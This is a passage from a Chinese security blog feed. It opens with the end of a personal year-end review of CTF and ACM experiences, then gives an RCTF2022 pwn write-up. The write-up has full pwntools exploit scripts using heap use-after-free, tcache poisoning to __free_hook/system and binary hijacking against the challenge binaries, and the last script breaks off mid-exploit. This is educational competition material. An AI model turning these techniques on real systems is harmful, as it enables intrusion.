+<p>感谢在V&amp;N的时候愿意听我牢骚和碎碎念的eeee和jsjsj两位pwn师傅，还有其他方向的师傅们，希望明年，甚至是以后，我们也能一起打比赛，一起在网络安全这条路上越走越远。</p>
+<p>各种意义上，感谢我的女朋友，感谢你在我低落的时候给予我安慰和鼓励，让我有了继续坚持下去的信心，你的陪伴也让我成长了很多很多。以后也要一起加油，一起达成我们的人生目标！</p>
+<p>感谢我的家人，感谢你们一直以来的支持和养育，希望大家都能健健康康的。</p>
+<p>感谢我的好兄弟们（别怀疑，这里面有你），你们的沙雕和趣事给我平淡的生活平添了许多乐趣，时不时的互相倾诉也为我缓解了很多压力，希望你们在新的一年里都能向着自己想要成为的人更近一步哦。</p>
+<h1 id="年终总结">年终总结</h1>
+<h2 id="学习">学习</h2>
+<p>既然是第一次在我的博客写年终总结，还是简单说一下学习安全的起因和历程吧。</p>
+<h3 id="作为acmer">作为ACMer</h3>
+<p>从2020年入学到2021年年底，我是一名acmer（虽然很fw），第一次打省赛只拿了铜牌，是铜首。败在了罚时上，很可惜没能拿到银，而且我当时也不会想到，那其实是我的最后一次ACM省赛了。在那之后还是断断续续的拿了一些算法方面的小奖，诸如天梯赛的省二和国三，蓝桥杯的省一和国三这些。</p>
+<p>最后一次打ICPC是2021年年底的上海站和南京站，因为新冠疫情改成了线上，拿牌的难度提升了不少，最终也不出所料的两站都打铁了。至此，我的ACM生涯也画上了不太圆满句号。<br>
+（不过我的两个队友都很棒哦，现在已经带着ICPC一银一铜，CCPC一铜的出色战绩退役了）</p>
+<h3 id="作为ctfer">作为CTFer</h3>
+<p>ACM的失败一度让我无法直视接下来的生活，在纠结了很久之后才选择了转行试试安全。</p>
+<p>起初我是想学习web安全的，但由于学校的实验室没有pwn手，我还是选择了这个陌生而奇妙的方向。</p>
+<p>在学习的前期其实非常的痛苦且缓慢，因为身边并没有学pwn的同学可以交流，偶尔在取得了不错的进展时，也不知道向谁分享（@怨种le1a）。（非常感谢自己扛着这些压力坚持到了现在）</p>
+<p>在学pwn第4个月的时候，同学提议我尝试一下去申请加入V&amp;N战队。究极社恐的我最终很坎坷的通过了面试，wjh师傅在面试时问的种种问题深深的烙在了我的脑袋里，我意识到了自己和大师傅们的差距有多么巨大，也暗下决心要成为和他们一样纯粹且强大的pwn手。（不过也正是因为加入了V&amp;N，我才能遇到这么多和我一样热爱二进制安全的师傅）</p>
+<p>一直在追赶版本的我直到今年7月份的ciscn国赛初赛才有了第一次检验自己的比赛机会。但是运气很好！队友们齐心协力，最终在分区赛以第10名的成绩拿到了晋级总决赛的最后一个名额，并且也收获了自己学安全的第一个奖（西南分区赛一等奖）。总决赛很遗憾的因为疫情没能去到南开大学，明明说好了要和各位师傅面基的（叹）。</p>
+<p>国赛之后，一场又一场的比赛接踵而至，我终于从只能刷题练级的萎靡状态中跳脱了出来。</p>
+<p>强网杯，网鼎杯都取得了不错的成绩（比较可惜的是网鼎杯的半决赛也因为疫情延期了，希望不要变成线上）。</p>
+<p>终于，在10月底，烨师傅给了我晋升到W&amp;M的面试机会。这其实是我完全没有想过的事（啊？我这么菜也配？），不过既然机会都来了，那就好好把握。在被龙哥和y老师，以及pwn大爹cnitlrt师傅面到怀疑人生，加上接近30个小时的漫长等待后，还是等来了成功加入W&amp;M的好消息。这也算是学了差不多刚好一年以来对我最好的一次正反馈吧。虽然我现在和各位pwn爹的实力差距还是很大很大，不过我还是会努力学习，争取早日能为队里出一份力的。</p>
+<p>在这几天打了强网拟态，本该是一场72小时的鏖战，但是我们的烨宝直接阳了（真惨hhh），我只在第一天打了五六道白盒的题就没做了。最后只有优胜奖，挺可惜的还是。</p>
+<p>这一年最不满意的还是一直没有开始实战吧，本来就学的比较晚，而且还马上就要面临秋招了。不过真的还有好多好多想要复现的题，也想在接下来的比赛中见识到和做到有质量的好题。到时候也许还是会继续打ctf的吧，但同时也希望实战能快快开始（又是从头开始摸爬滚打的项目捏）。</p>
+<h2 id="生活">生活</h2>
+<p>2022年依然是被疫情折磨的一年。从ICPC到CISCN，似乎已经错过了四五个线下比赛的机会了吧。而且也因为疫情，和女朋友的见面机会也变得比之前少太多了。希望疫情能快快过去吧（现在已经放开了，但愿是件好事吧）。</p>
+<p>除了被疫情折磨，由于长时间的久坐，我的腰和脖子也处于不太健康的状态。最近有在加强锻炼，算是为了减肥和健康（）。</p>
+<p>买了个switch，挺好玩的。甚至有1周因为学校的遣返等种种原因，就一直在玩switch而没有学习（我有罪）。</p>
+<p>随便贴几张图片：</p>
+<p>ACM省赛</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/83f3c31614ade.jpg" alt="IMG_20210530_140102.jpg" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/278776a87ec9b.jpg" alt="IMG_20210530_143253.jpg" loading="lazy"></figure>
+<p>挖到TSRC，腾讯叠送的衣服</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/4401dd40b18cc.png" alt="1671441255726.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/091d966259ec7.png" alt="1671442591808.png" loading="lazy"></figure>
+<p>ciscn决赛抽到的一等奖奖品</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/cee39ed518563.png" alt="1671441358074.png" loading="lazy"></figure>
+<p>V&amp;N的队服，好看捏</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/9c2bbe04ba3ca.png" alt="1671441714890.png" loading="lazy"></figure>
+<p>七夕和女朋友一起做的魔鬼料理</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/62b52d0de4455.png" alt="1671441567709.png" loading="lazy"></figure>
+<p>给女朋友织的包包（不得不说，我太拙了，所以不放成品）</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/2192ed35a2f6a.png" alt="1671442044383.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/fbb2b202bd69a.png" alt="1671442106719.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/d75304f47f07a.png" alt="1671442146686.png" loading="lazy"></figure>
+<p>陪我住院6天的病友，每天去医院的路上都能看到它</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/af37177bf44fc.png" alt="1671442247945.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/9c7456050d427.png" alt="1671442296213.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/822b1c14eb181.png" alt="1671442318940.png" loading="lazy"></figure>
+<p>朋友送的Jorin手办，她好帅</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/82c693d859b07.jpg" alt="-76cdf5f2c5b4e727.jpg" loading="lazy"></figure>
+<p>省赛和Le1a一起住的酒店，不得不说比ACM省赛那会儿住的好太多了</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/fc0f69c10425c.png" alt="1671442454190.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/931ee7d0e610d.png" alt="1671442479573.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/0310d4923e1ad.png" alt="1671442531211.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/19/14fd28073b2ca.png" alt="1671442557661.png" loading="lazy"></figure>
+<h1 id="对2023的希望">对2023的希望</h1>
+<ul>
+<li>开始挖固件，求求了</li>
+<li>为毕设做准备，写一个qt的小项目</li>
+<li>在时间和身体允许的条件下多做运动，争取回到高中的身材捏</li>
+<li>和我在意的大家 仲良くして ！</li>
+<li>还有太多太多了，希望都能实现吧</li>
+</ul>
+<p>最后，再次感谢看到了这里的你们，祝大家在崭新的一年里都万事如意嗷。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[RCTF2022-PWN-WP/复现]]></title>
+        <id>https://kotoriseed.github.io/post/rctf/</id>
+        <link href="https://kotoriseed.github.io/post/rctf/">
+        </link>
+        <updated>2022-12-16T09:50:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="game非预期">game[非预期]</h1>
+<p>本来是kernel提权题，但docker起起来之后发现<code>/bin</code>权限比较大，所以存在非预期。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/7f28ea8ce7380.png" alt="1671183918059.png" loading="lazy"></figure>
+<p><code>init</code>是root权限运行的，</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/c30d3dd6f9b0f.png" alt="1671183969695.png" loading="lazy"></figure>
+<p>在shell退出之后还有<code>umount</code>和<code>poweroff</code>两个指令。所以劫持其中一个binary，然后退出shell就能带出flag。</p>
+<pre><code class="language-shell">cd /bin
+rm ./umount
+echo 'cat flag'&gt;umount
+chmod 777 ./umount
+exit
+</code></pre>
+<h1 id="ez_atm">ez_atm</h1>
+<h2 id="分析">分析</h2>
+<p>给出了一个客户端<code>client</code>和带有漏洞的服务端<code>ez_atm</code>，两者使用socket进行通信。</p>
+<p>查看<code>Data_send</code>结构体即可了解通讯使用的协议，</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/dda7b04ec200a.png" alt="1671164220749.png" loading="lazy"></figure>
+<p>在建立socket连接之后，服务端会fork出一个子进程，并且即刻生成该次会话使用的uuid，并且将随机数使用的种子发给客户端。然后会尝试从客户端收到uuid并验证是否一致。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/94ead074d25ef.png" alt="1671164490295.png" loading="lazy"></figure>
+<p>客户端对应的操作是接受到种子并用相同的逻辑生成uuid，然后发送。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/b8030e68d0ba0.png" alt="1671164596484.png" loading="lazy"></figure>
+<p>主要功能的逆向略过，这里只说漏洞点。</p>
+<p>第一个是leak libc，在<code>stat_query</code>中。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/acdf4ef8fd8f3.png" alt="1671166153796.png" loading="lazy"></figure>
+<p>这里send过来了很多栈上的数据，可以帮助leak。</p>
+<p>但是在发送到客户端之后直接被接收了，我们需要对客户端稍作修改，让他打印出来。</p>
+<p>（其实是还有另一种思路的，不使用客户端去交互，直接按照协议手动发包模拟客户端行为。只不过这样就需要在一开始验证uuid那里手动按照逻辑生成一下）</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/15/be17183e0e3e1.png" alt="1671084514031.png" loading="lazy"></figure>
+<p>这里是libc上的地址，测出偏移后将客户端对应部分patch如下：</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/15/e8dd6173fe2cd.png" alt="1671084764752.png" loading="lazy"></figure>
+<p>测试一下，成功leak：</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/15/7cf085c934dd4.png" alt="1671085000540.png" loading="lazy"></figure>
+<p>在<code>new_account</code>中会申请0x41的chunk，然后<code>passwd</code>和<code>account_id</code>分别对应了tcache的<code>next</code>和<code>key</code>的位置。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/96e6a5f7cd27e.png" alt="1671170791940.png" loading="lazy"></figure>
+<p>在<code>cancellation</code>中存在明显的uaf。</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/04eb063b3db3f.png" alt="1671171007280.png" loading="lazy"></figure>
+<p>思路至此就很明显了，tcache poisoning申请到free hook写入system。</p>
+<p>不过想要uaf修改，还需要先login，一个account被free之后password会是堆上的地址，所以还需要leak一下。</p>
+<p>布置好freed chunk之后还是先在client的内存中找到heap地址相对于<code>msg_rec</code>的偏移</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/a040e060d620b.png" alt="1671176781065.png" loading="lazy"></figure>
+<p>然后对client的query功能patch如下：</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/7f233395d3e8c.png" alt="1671176871678.png" loading="lazy"></figure>
+<p>成功leak，</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/ae639937b6301.png" alt="1671176921530.png" loading="lazy"></figure>
+<p>接下来就是正常的uaf劫持tcache next指针，这里不作详细描述。</p>
+<p>成功劫持free hook后外带flag使用<code>cat flag&gt;&amp;4</code>来发给客户端。</p>
+<p>不过用free hook来执行system时，参数是<code>password</code>处，而<code>password</code>的长度只有8bytes，有点不够，所以需要配合<code>account_id</code>来拼接。所以我的构造如下：</p>
+<ul>
+<li>account_id: &gt;&amp;4</li>
+<li>password: cat flag</li>
+</ul>
+<h2 id="exp">exp</h2>
+<p>(需要模拟client发送协议交互的话可以参考注释掉的两个函数来建立连接和发包)</p>
+<pre><code class="language-python">from pwn import *
+from ctypes import *
+import os
+
+context.log_level='debug'
+
+elf = ELF('./docker/bin/ez_atm')
+libc = ELF('./docker/bin/libc-2.27.so')
+clibc = cdll.LoadLibrary('./docker/bin/libc-2.27.so')
+
+sa  = lambda x,y : p.sendafter(x, y)
+sla = lambda x,y : p.sendlineafter(x, y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g():
+	os.system('ps -a | grep ez_atm')
+	raw_input()
+
+'''
+def init_cli():
+	ask_time = u32(p.recv(4))
+	# print(hex(ask_time))
+	clibc.srand(ask_time)
+	uuid = list(&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;)
+	for i in range(len(uuid)):
+		if uuid[i] != '4' and uuid[i] != '-':
+			if uuid[i] == 'x':
+				uuid[i] = hex(clibc.rand()%15)[2:]
+			else:
+				uuid[i] = hex((clibc.rand()%15) &amp; 3 | 8)[2:]
+	uuid = ''.join(uuid)
+	p.send(uuid)
+
+def data_send(op, password=b'', account_id=b'', money=114514):
+	data = flat(
+		{
+			0x0: op,
+			0x10: password,
+			0x18: account_id,
+			0x38: p32(money),
+		},
+		filler=b'\x00'
+	).ljust(0x98, b'\x00')
+	sleep(0.5)
+	p.send(data)
+'''
+
+def choice(op):
+	sla('choice :', op)
+
+def add_account(id='kotori', passwd='passwd', money=114514):
+	choice('new_account')
+	sla('account id', id)
+	sla('password', passwd)
+	sla('money', str(money))
+
+def del_account(passwd='passwd'):
+	choice('cancellation')
+	sla('password', passwd)
+
+def login(id, passwd='passwd'):
+	choice('login')
+	sla('account id', id)
+	sla('password', passwd)
+
+def edit_passwd(new_pass, old_pass):
+	choice('update_pwd')
+	sla('new password', new_pass)
+	sleep(0.5)
+	sla('rd.', old_pass)
+
+p = process(['./client', '139.9.242.36', '4445'])
+# p = process(['./client', '127.0.0.1', '3339'])
+
+'''
+p = remote('127.0.0.1', 3339)
+init_cli()
+
+data_send('new_account', 'passwd', 'ko1')
+data_send('exit_account')
+data_send('new_account', 'passwd', 'ko2')
+data_send('cancellation', 'passwd')
+data_send('login', 'passwd', 'ko1')
+data_send('query')
+'''
+
+choice('stat_query')
+libcbase = u64(ru('\x7f')[-6:].ljust(0x8, b'\x00')) - 0x21c87
+sys = libcbase + libc.symbols['system']
+hook = libcbase + libc.symbols['__free_hook']
+print(hex(libcbase))
+print(hex(hook))
+
+# data_send('new_account', 'passwd', 'ko1')
+add_account('ko1')
+choice('exit_account')
+add_account('ko2')
+del_account()
+login('ko1')
+choice('query')
+heapbase = u64(ru('\x55')[-6:].ljust(0x8, b'\x00')) - 0x10
+print(hex(heapbase))
+choice('exit_account')
+
+add_account('ko3')
+choice('exit_account')
+add_account('ko4')
+choice('exit_account')
+login('ko3')
+del_account()
+login('ko4')
+del_account()
+
+login(p64(heapbase+0x10), p64(heapbase+0x6b0))
+edit_passwd(p64(hook), p64(heapbase+0x6b0))
+choice('exit_account')
+
+add_account('&gt;&amp;4', 'cat flag')
+choice('exit_account')
+add_account('pwn', p64(sys))
+choice('exit_account')
+login('&gt;&amp;4', 'cat flag')
+del_account('cat flag')
+
+# g()
+
+p.interactive()
+</code></pre>
+<h1 id="ppurey">ppurey</h1>
+<h2 id="分析-2">分析</h2>
+<p>一个管理数据库的菜单题。看上去没什么问题，不过在<code>show_note</code>内部存在一个语句：<code>SELECT * FROM test</code></p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/9684c52585dcc.png" alt="1671193372553.png" loading="lazy"></figure>
+<p>只要让一个视图也叫<code>test</code>，就能执行很多操作。不过到这里之后思路忽然就断了，不是很能找到他可利用的洞在哪里。</p>
+<p>在这时忽然发现bss段上存在一个<code>g_chunks</code>数组，</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/b81299c4dc07b.png" alt="1671193684388.png" loading="lazy"></figure>
+<p>交叉引用一看，好家伙。很可疑的四个函数。</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/92a226b032acc.png" alt="1671193761393.png" loading="lazy"></figure>
+<p>随便找到一个，继续交叉引用，来到了data段上，发现了几个奇怪的字符串&quot;sm&quot;, &quot;se&quot;, &quot;ss&quot;, &quot;sd&quot;。</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/b212e5c1d98d7.png" alt="1671193826181.png" loading="lazy"></figure>
+<p>继续在前后看了看，发现了&quot;random&quot;, &quot;hex&quot;, &quot;ifnull&quot;等字符串，</p>
+<p>ん?这不就是sqlite3函数的symbol么。</p>
+<p>至此，一片新世界打开了。</p>
+<p>&quot;sm&quot;, &quot;se&quot;, &quot;ss&quot;, &quot;sd&quot;分别对应堆块的malloc, edit, show, delete操作，并且在delete操作中存在uaf</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/4d695eac1ef9b.png" alt="1671194070865.png" loading="lazy"></figure>
+<p>整理一下思路：</p>
+<ol>
+<li>利用原有的菜单功能创建一个数据库，并且将<code>test</code>作为视图操作写入这个数据库中</li>
+<li>在<code>test</code>中利用<code>sm</code>, <code>se</code>, <code>ss</code>, <code>sd</code>这几个函数来操作堆块</li>
+<li>uaf打tcache的next，劫持<code>__free_hook</code>为system完成利用。</li>
+</ol>
+<p>（在做题的时候发现，这题的heap布局极其凌乱，不过好在show是直接write，所以拿一个unsorted bin上的chunk就可以直接leak出残留的libc地址。好久都没做到不是<code>puts</code>来show的题了，泪目）</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sqlite3
+import os
+
+context.log_level='debug'
+
+elf = ELF('./ppuery')
+libc = elf.libc
+
+# p = process('./ppuery')
+p = remote('190.92.233.46', 10000)
+
+sa  = lambda x,y : p.sendafter(x,y)
+sla = lambda x,y : p.sendlineafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+    raw_input()
+
+def choice(idx):
+	sla('Choice: ', str(idx))
+
+def add_note(name):
+	choice(1)
+	sla('Name: ', name)
+
+def show_note(idx):
+	choice(2)
+	sla('Index: ', str(idx))
+
+def patch_note(idx, content):
+	choice(3)
+	sla('Index: ', str(idx))
+	sla('Size: ', str(len(content)))
+	sla('tent: ', content)
+
+def exec_cmd(cmd):
+	os.system(&quot;rm ./kotori.db&quot;)
+	conn = sqlite3.connect('kotori.db')
+	cur = conn.cursor()
+	sql_cmd = 'CREATE VIEW test AS SELECT {}'.format(cmd)
+	print(sql_cmd)
+	cur.execute(sql_cmd)
+	conn.commit()
+	conn.close()
+	f = open('kotori.db', 'rb').read()
+	patch_note(0, f)
+	show_note(0)
+
+def add(idx, size):
+	exec_cmd('sm({},{})'.format(idx, size))
+
+def edit(idx, offset, content):
+	exec_cmd('se({},{},{})'.format(idx, offset, content))
+
+def show(idx):
+	exec_cmd('ss({})'.format(idx))
+
+def delete(idx):
+	exec_cmd('sd({})'.format(idx))
+
+add_note('aa')
+
+add(0, 0x1f0)
+show(0)
+ru('Content:')
+libcbase = u64(p.recv(8)) - 0x3ebca0
+sys = libcbase + libc.symbols['system']
+hook = libcbase + libc.symbols['__free_hook']
+print(hex(libcbase))
+
+add(1, 0xb0)
+add(2, 0xb0)
+delete(1)
+delete(2)
+edit(2, 0, hook)
+
+add(3, 0xb0)
+add(4, 0xb0)
+edit(3, 0, u64(b'/bin/sh\x00'))
+edit(4, 0, sys)
+
+delete(3)
+# g()
+
+p.interactive()
+</code></pre>
+<h1 id="mycarshowspeed">MyCarShowSpeed</h1>
+<p>又是我最爱的游戏题（划掉）</p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/18/ef592c508cf10.png" alt="1671354090140.png" loading="lazy"></figure>
+<h2 id="分析-3">分析</h2>
+<p>一个赛车游戏，给出了源码。</p>
+<p>经过一段时间的查找，发现在赢得足够多的钱的时候可以直接在商店购买flag</p>
+<pre><code class="language-c">//store.c
+
+...
+
+static goods_t normalCar = {&quot;NormalCar&quot;, 50};
+static goods_t superCar = {&quot;SuperCar&quot;, 100};
+static goods_t LongCar = {&quot;LongCar&quot;, 180};
+static goods_t ghostCar = {&quot;GhostCar&quot;, 200};
+static goods_t fuel = {&quot;Fuel&quot;, 10};
+static goods_t normalTire = {&quot;NormalTire&quot;, 20};
+static goods_t SuperTire = {&quot;SuperTire&quot;, 80};
+static goods_t flag = {&quot;flag&quot;, 9999};
+
+...
+
+void sellGoodsImpl(store_t *_this, game_t *game)
+{
+	...
+        else if(strcmp(goods-&gt;name, &quot;flag&quot;) == 0)
+        {
+            ....
+            
+			else
+            {
+                int fd;
+                char buf[64];
+                puts(&quot;You've earned it!&quot;);
+                puts(&quot;Here is your flag!&quot;);
+                fd = open(&quot;./flag&quot;, O_RDONLY);
+                if(fd &gt;= 0)
+                {
+                    read(fd, buf, 64);
+                    write(1, buf, 64);
+                }
+            }
+			return;
+        }
+		...
+}
+</code></pre>
+<p>所以着重观察一下和钱相关的部分。</p>
+<p>在<code>fetchCarImpl</code>中，出题人好心的给出了一个注释：<code>//0</code></p>
+<pre><code class="language-c">//store.c
+car_t * fetchCarImpl(store_t *_this, game_t *game)
+{
+    ...
+
+    fixDifficulty = car-&gt;fixDifficulty;
+    
+    ...
+    
+    fetchTime = fetchHour * 3600 +  fetchMin * 60 + fetchSec * fixDifficulty;// 0
+    fixTime   = fixHour * 3600 + fixMin * 60 + fixSec;
+    
+    fixedTime = fetchTime - fixTime;
+    cost = 5 * fixedTime;
+    if(cost &gt; (int)game-&gt;money)
+        cost = game-&gt;money;
+    car-&gt;health += (int)(fixedTime * 0.4) + 50;
+    game-&gt;money -= cost;
+    
+    ...
+        
+}
+</code></pre>
+<p>如果<code>fixDifficulty</code>为0的话，<code>fetchTime</code>将会小于<code>fixTime</code>，那么<code>cost</code>也将变为负数......</p>
+<p><code>game-&gt;money -= cost</code>这一句，不就可以帮助我们快速搞钱了吗。</p>
+<p>所以赶紧去找找<code>fixDifficulty</code>的来头。</p>
+<pre><code class="language-c">//car.h
+struct car
+{
+    char        name[8];
+    uint8_t     type; 
+    uint8_t     performance;
+    uint8_t     isTaken;
+    uint8_t     isWon;
+    uint8_t     fixed;
+    uint8_t     step;
+    uint8_t     fixDifficulty; 
+    
+    ...
+    
+};
+</code></pre>
+<p>这个<code>fixDifficulty</code>是在<code>car.h</code>中声明的一个<code>unit8_t</code>类型的变量，</p>
+<p>并且每局比赛结束会有<code>_this-&gt;finishGame(_this)</code>这一句来调用<code>finishGameImpl</code>，</p>
+<p><code>finishGameImpl</code>会让<code>car-&gt;fixDifficulty++;</code>。</p>
+<p>所以说，只要快速刷对局，到第255次之后，不停的修车取车就能大赚一笔。</p>
+<p>（ps. 最好将时间的秒数控制在较大的秒数，不然会刷的很慢）</p>
+<p>（pps. 你每次调试都要等差不多一分钟的样子真的很狼狈.jpg）</p>
+<p>虽然钱是拿到了，但是这时又注意到购买flag的另一个检查条件。</p>
+<pre><code class="language-c">//store.h
+if(game-&gt;winTimes &lt; 1000)
+{  
+	puts(&quot;No! You cheated in this game! Where did your money come from?\n&quot;);
+	puts(&quot;Punish for cheaters!\nYour cars are confiscated!&quot;);
+	carList_t *curCar = game-&gt;carList;
+	while(curCar)
+	{
+		car_t *car = curCar-&gt;car;
+		if(car)
+		{
+			free(car);
+			curCar-&gt;car = NULL;
+		}
+		curCar = curCar-&gt;next;
+	}
+	game-&gt;carList-&gt;carNums = 0;
+	game-&gt;userCar = NULL;
+}
+</code></pre>
+<p>要让这个<code>winTimes</code>要达到1000，还需要再想一些办法。（比赛中到这里就停下来啦，后面的做法参考了<code>Nu1L</code>战队的WriteUp）</p>
+<p>这个时候其实可以察觉到，好像买flag被发现作弊时清空车辆的时候是存在uaf的。</p>
+<p>并且除了这里的<code>game-&gt;carList</code>以外，在<code>store.c</code>中修车和取车时还有一个carList。</p>
+<p>相当于<code>game-&gt;carList</code>成为了一个dangling pointer。</p>
+<p>并且参考<code>car.h</code>中对car的定义：</p>
+<pre><code class="language-c">struct car
+{
+    char        name[8];
+    uint8_t     type; 
+    uint8_t     performance;
+    uint8_t     isTaken;
+    uint8_t     isWon;
+    uint8_t     fixed;
+    uint8_t     step;
+    uint8_t     fixDifficulty; 
+    
+    int         fuel;
+    int         stability;
+    int         health; 
+    int         row;
+    int         col;
+    int         cost;
+    int         padding;
+    time_t      fixTime;
+
+    int         (*moveCar)(car_t *_this);
+    void        (*addFuel)(car_t *_this);
+    void        (*increaseSpeed)(car_t *_this);
+    void        (*gainExp)(car_t *_this);
+    void        (*fix)(car_t *_this);
+    void        (*printCar)(car_t *_this);
+    int         (*getStep)(car_t *_this);
+
+};
+</code></pre>
+<p>在本来属于<code>tcache</code>的<code>key</code>的值的那个位置，会有许多的<code>uint8_t</code>类型的标记位，且很多标记位在取车和修车时都在被修改，所以<code>tcache bin</code>对double free的check会有相当大的概率可以被bypass。</p>
+<p>所以最少只需要按照：</p>
+<ol>
+<li>修车，将当前car放入<code>store-&gt;carList</code></li>
+<li>购买flag，将car free进入tcache bin。</li>
+<li>取车，从<code>store-&gt;carList</code>中拿出，并且改掉某些标记位从而让key不被check</li>
+</ol>
+<p>这几个步骤来循环3次，就能在tcache中造出环，且足以完成对<code>winTimes</code>的劫持。</p>
+<p>（需要注意的是，每次在购买flag之后，车名会因为进入tcache而变化）</p>
+<p>（取车时还可以通过车名leak出heapaddr，借此计算出winTimes的地址）</p>
+<h2 id="exp-3">exp</h2>
+<pre><code class="language-python">from pwn import *
+from datetime import *
+
+context.log_level='debug'
+
+elf = ELF('./SpeedGame')
+
+p = process('./SpeedGame')
+
+sa  = lambda x,y : p.sendafter(x,y)
+sla = lambda x,y : p.sendlineafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+
+def choice(op):
+	sla('\n&gt;', op)
+
+def buyCar(name):
+	choice('3')
+	choice('1')
+	choice('SuperCar')
+	choice(name)
+	choice('5')
+
+def buyFlag():
+	choice('3')
+	choice('1')
+	choice('flag')
+	choice('5')
+
+def buyFlag():
+	choice('3')
+	choice('1')
+	choice('flag')
+	choice('5')
+
+def fixCar(name=''):
+	choice('3')
+	choice('3')
+	choice(name)
+	choice('5')
+
+def fetchCar(name):
+	choice('3')
+	choice('4')
+	choice(name)
+	choice('5')
+
+def play():
+	choice('1')
+	ru('Press q to quit.')
+	p.send(' ')
+	p.send('q')
+
+buyCar('kot')
+
+for i in range(255):
+	play()
+
+while(datetime.now().second&lt;40):
+	sleep(1) # fixsec++
+	print('[+] waiting for big sec...')
+
+for i in range(60): # earn money
+	fixCar('kot')
+	fetchCar('kot')
+
+fixCar('kot')
+buyFlag()
+fetchCar('')
+
+fixCar()
+buyFlag()
+choice('3')
+choice('4')
+ru('CarName: ')
+cname = p.recv(6)
+choice(cname)
+choice('5')
+
+heap_info = u64(cname.ljust(0x8, b'\x00'))
+
+print(hex(heap_info))
+
+fixCar(cname)
+buyFlag()
+fetchCar(cname)
+
+winTimes_addr = heap_info - 0x2b0
+buyCar(p64(winTimes_addr))
+buyCar('kot')
